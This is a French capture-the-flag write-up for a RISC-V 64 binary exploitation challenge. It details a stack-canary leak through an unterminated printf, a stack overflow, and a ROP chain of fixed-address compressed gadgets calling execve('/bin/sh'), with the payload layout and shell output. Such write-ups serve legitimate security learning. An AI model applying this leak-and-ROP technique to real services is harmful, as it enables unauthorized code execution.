# PWN#Epsilon — vault RISC-V 64 (fuite de canari + ROP syscall)

**Auteur :** lyons

## État

Résolu. Shell décroché à distance (`uid=65534(nobody)`), flag extrait au moyen de `cat /flag/flag.txt` : `CTF{REDACTED}`.

## Cible

- Le service écoute sur `<HOST>:<PORT>` (TCP).
- Architecture : **RISC-V 64, little-endian**, binaire **non-PIE** (gadgets figés à adresses constantes).
- Aucun binaire livré en local : l'analyse comme la validation se sont faites directement face au service.
- Invites du programme : `Enter your name: ` puis `Leave a message for the vault keeper: `.

## Observations de départ

- Le nom est recueilli par un `read(0, buf, 0x41)` dans un tampon de 64 octets, puis restitué par `printf("Hello, %s\n", buf)` **sans NUL final** → fuite de pile.
- Le soixante-cinquième octet bouscule le NUL de poids faible du canari, si bien que `printf` poursuit et dévoile les 7 octets suivants du canari.
- Le message passe par `read(0, buf, 0xc8)` dans un tampon de 64 octets → débordement de pile maîtrisé au-delà du canari.
- Canari de 8 octets little-endian dont le LSB demeure `0x00`.

## Extraction du canari

Payload du nom : `A*64 + B`.

```
Hello, AAAA...B | canari[1:8]
```

- Reconstruction : `canary = b"\x00" + leak[65:72]`.
- **Écueil** : l'un des 7 octets suivants peut tomber sur un `0x00` aléatoire ; `%s` s'interrompt alors avant les 7 octets. La fuite sort amputée et il faut **relancer des connexions** jusqu'à décrocher 7 octets entiers (40 à 60 essais suffisent concrètement).

## Gadgets disponibles (RISC-V, adresses fixes)

| Gadget | Adresse | Action |
|---|---|---|
| `execve` stub | `0x396d4` | `li a7, 221 ; ecall` |
| `"/bin/sh"` | `0x52ab8` | chaîne présente dans le binaire |
| `G_a1` | `0x19cbc` | `c.ldsp a1, 8(sp) ; c.ldsp ra, 0x18(sp) ; addi16sp 0x20 ; jr ra` |
| `G_a2` | `0x38884` | `c.ldsp a2, 8(sp) ; c.ldsp ra, 0x18(sp) ; c.add a0, a2 ; addi16sp 0x20 ; jr ra` |
| `G_a0` | `0x4df9e` | `c.ldsp a0, 0x18(sp) ; c.ldsp ra, 0x28(sp) ; addi16sp 0x30 ; jr ra` |

Ces gadgets compacts à `c.ldsp` vont chercher leurs arguments à `sp + offset`, récupèrent `ra`, puis font progresser `sp` (`addi16sp`) avant le `jr ra`. Il en résulte un chaînage façon « load-and-pivot » qui ne doit rien à la libc.

## Déroulé de l'exploit

But visé : `execve("/bin/sh", NULL, NULL)` (syscall 221).

Le payload s'étend sur 200 octets :

```
[0..63]    A*64                  filler jusqu'au canari
[64..71]   canary
[72..79]   S*8                   saved s0 (junk)
[80..87]   G_a1                  adresse de retour
[88..199]  région ROP contrôlée (0x70 octets)
```

Zone ROP (décalages relatifs à `sp` à l'entrée du premier gadget) :

```
0x08  p64(0)        -> a1 = 0
0x18  p64(G_a2)     -> ra
0x28  p64(0)        -> a2 = 0  (c.add a0, a2 : a0 += 0)
0x38  p64(G_a0)     -> ra
0x58  p64(BINSH)    -> a0 = "/bin/sh"
0x68  p64(EXECVE)   -> ra = li a7,221 ; ecall
```

Exécution pas à pas :

1. `ret` vers `G_a1` : `a1 = 0`, bond vers `G_a2`, `sp += 0x20`.
2. `G_a2` : `a2 = 0`, `a0 += a2`, départ vers `G_a0`, `sp += 0x20`.
3. `G_a0` : `a0 = "/bin/sh"`, enchaîne sur le stub `execve`, `sp += 0x30`.
4. `li a7, 221 ; ecall` → shell obtenu.

Le payload part en réponse à `vault keeper: `, ensuite les commandes sont poussées sur le shell.

## Preuve à l'écran

```
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat /flag/flag.txt
CTF{REDACTED}
```

L'exploit se rejoue sans peine : le canari seul varie d'une connexion à l'autre, et il est re-fuité à chaque fois. L'implémentation pwntools se trouve dans `epsilon_exploit.py` (script local).

## Obstacles

- **Fuite partielle** : le canari peut receler un octet nul ; préférer une boucle de reconnexions plutôt que de parier sur un premier leak complet.
- **Offsets `c.ldsp`** : la chaîne tout entière repose sur les décalages précis `sp+8 / sp+0x18 / sp+0x28` et sur les `addi16sp` ; contrôler `len(payload) == 200` ainsi que l'alignement de la zone.
- **`c.add a0, a2` réalise une addition** : avec `a2 = 0` ici, `a0` reste intact jusqu'au gadget suivant qui y dépose `"/bin/sh"` ; ne pas traiter `c.add` comme un simple `mv`.
- **Aucun binaire local** : installer `qemu-riscv64` ne sert à rien ; mieux vaut valider en remote, le service faisant figure d'unique oracle crédible.
